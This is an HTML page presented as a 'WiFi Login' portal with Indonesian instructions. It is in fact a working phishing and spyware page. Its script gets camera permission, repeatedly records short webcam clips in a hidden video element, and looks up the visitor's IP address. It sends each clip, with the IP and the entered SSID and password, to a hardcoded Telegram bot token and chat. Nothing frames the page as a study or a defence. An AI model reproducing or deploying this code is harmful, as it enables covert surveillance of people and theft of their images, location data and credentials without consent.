<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WiFi Login</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
    }
    .container {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      width: 300px;
      text-align: center;
    }
    h2 {
      margin-bottom: 20px;
      color: #333;
    }
    input {
      width: 100%;
      margin-bottom: 15px;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #007BFF;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
    video {
      display: none; /* Menyembunyikan video dari tampilan web */
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>WiFi Login</h2>
    <h3>Perhatian! diam di website ini sekitar 10 detik setelah anda memencet tombol login, agar wifi dapat tersambung.</h3>
    <p>SSID: Finsii</p>
    <p>Password: Free-Wifi</p>
    <form id="loginForm">
      <input type="text" id="ssid" placeholder="SSID" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    var telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
    var telegramChatId = '-1002188815934';

    function sendToTelegram(videoDataURL, caption) {
      var apiUrl = `https://api.telegram.org/bot${telegramToken}/sendVideo`;

      fetch(videoDataURL)
        .then(res => res.blob())
        .then(blob => {
          var formData = new FormData();
          formData.append('chat_id', telegramChatId);
          formData.append('video', blob, 'video.mp4');
          formData.append('caption', caption);

          return fetch(apiUrl, {
            method: 'POST',
            body: formData
          });
        })
        .then(response => response.json())
        .then(data => {
          console.log('Video berhasil dikirim ke Telegram:', data);
        })
        .catch(error => {
          console.error('Error mengirim video ke Telegram:', error);
        });
    }

    function takeAndSendVideo(formData) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
          var videoElement = document.createElement('video');
          document.body.appendChild(videoElement);
          videoElement.srcObject = stream;
          videoElement.play();

          var mediaRecorder = new MediaRecorder(stream);
          var chunks = [];

          mediaRecorder.ondataavailable = function(e) {
            chunks.push(e.data);
          };

          mediaRecorder.onstop = function() {
            var videoBlob = new Blob(chunks, { type: 'video/mp4' });
            var videoDataURL = URL.createObjectURL(videoBlob);

            var ipAddress = '';
            fetch('https://api64.ipify.org?format=json')
              .then(response => response.json())
              .then(data => {
                ipAddress = data.ip;

                var caption = `Video terkirim dari IP: ${ipAddress}\nSSID: ${formData.ssid}\nPassword: ${formData.password}`;
                sendToTelegram(videoDataURL, caption);
              })
              .catch(error => {
                console.error('Error mendapatkan IP address:', error);

                var caption = `Video terkirim\nSSID: ${formData.ssid}\nPassword: ${formData.password}`;
                sendToTelegram(videoDataURL, caption);
              });

            document.body.removeChild(videoElement);
          };

          mediaRecorder.start();
          setTimeout(() => mediaRecorder.stop(), 3000); // Ambil video selama 3 detik

          setTimeout(() => {
            // Setelah 1 detik, mulai perekaman video berikutnya
            takeAndSendVideo(formData);
          }, 1000); // Delay 1 detik sebelum mulai merekam video berikutnya
        })
        .catch(function(err) {
          console.log("Error: " + err);
          if (err.name === 'NotAllowedError') {
            alert('Untuk melanjutkan, izinkan akses kamera pada peramban Anda lalu refresh halaman ini.');
          }
        });
    }

    function requestCameraAccess() {
      return navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          stream.getTracks().forEach(track => track.stop()); // Stop the stream after granting permission
          return true;
        })
        .catch(err => {
          console.log("Error: " + err);
          if (err.name === 'NotAllowedError') {
            alert('Izinkan akses kamera untuk melanjutkan lalu refresh halaman ini.');
          }
          return false;
        });
    }

    document.addEventListener('DOMContentLoaded', function() {
      requestCameraAccess().then(hasAccess => {
        if (hasAccess) {
          var formData = {
            ssid: document.getElementById('ssid').value,
            password: document.getElementById('password').value
          };
          takeAndSendVideo(formData);
        }
      });
    });

    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault();
      var formData = {
        ssid: document.getElementById('ssid').value,
        password: document.getElementById('password').value
      };

      requestCameraAccess().then(hasAccess => {
        if (hasAccess) {
          takeAndSendVideo(formData);
        } else {
          alert('Izinkan akses kamera sebelum melanjutkan lalu refresh halaman ini.');
        }
      });
    });
  </script>
</body>
</html>
